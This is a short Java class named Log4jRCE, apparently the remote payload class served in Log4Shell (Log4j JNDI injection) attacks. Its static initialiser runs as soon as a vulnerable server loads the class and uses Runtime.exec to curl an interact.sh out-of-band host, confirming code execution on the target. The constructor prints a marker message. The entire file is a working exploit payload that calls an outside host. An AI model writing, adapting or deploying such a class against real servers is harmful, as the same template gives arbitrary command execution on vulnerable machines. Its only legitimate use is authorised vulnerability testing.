public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("curl c78anrz2vtc0000mmfg0gdwfkhcyyyyyb.interact.sh").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
